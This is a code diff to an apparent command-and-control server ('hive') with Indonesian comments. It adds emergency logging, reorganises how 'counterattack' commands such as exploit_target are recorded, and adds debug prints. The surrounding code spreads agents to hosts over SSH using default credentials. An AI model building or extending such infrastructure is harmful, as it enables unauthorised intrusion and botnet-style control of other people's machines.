@@ -192,6 +192,8 @@ async def get_dashboard_data():
     targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in c.fetchall()]
     c.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
     reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in c.fetchall()]
+    c.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
+    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in c.fetchall()]
     conn.close()
     
     anomalies = analyze_threats(reports)
@@ -210,7 +212,8 @@ async def get_dashboard_data():
         ]
     }
     
-    return {"agents": agents, "targets": targets, "reports": reports, "network": network_data}
+    print(f"Returning data: {agents}, {reports}, {targets}")  # Debug log
+    return {"agents": agents, "targets": targets, "reports": reports, "emergency_logs": emergency_logs, "network": network_data}
 
 # Endpoint untuk perintah
 @app.post("/command", dependencies=[Depends(verify_token)])
@@ -221,19 +224,22 @@ async def send_command(command: Command):
     
     conn = sqlite3.connect("throng.db")
     c = conn.cursor()
+    if command.target:
+        if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
+            c.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
+                      (command.agent_id, command.target, command.action))
+        elif command.action == "scan_target":
+            c.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
+                      (command.target, "pending", 0.0))
+        if command.emergency:
+            c.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
+                      (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
     if command.action == "spawn_agent" and command.target:
         credentials = command.params.get("credentials", {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
         new_agent_id = spawn_agent_ssh(command.target, credentials)
         if new_agent_id:
             c.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
                       (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
-    elif command.target:
-        if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
-            c.execute("INSERT INTO agents (agent_id, target, action) VALUES (?, ?, ?)", 
-                      (command.agent_id, command.target, command.action))
-        elif command.action == "scan_target":
-            c.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
-                      (command.target, "pending", 0.0))
     conn.commit()
     conn.close()
 
@@ -262,6 +268,7 @@ async def websocket_endpoint(websocket: WebSocket):
         conn.commit()
         conn.close()
 
+        print(f"Received report from {agent_id} with data: {report_data}")  # Debug log
         await websocket.send_text(f"Hive received report from {agent_id}")
 
 # Endpoint utama untuk render dashboard
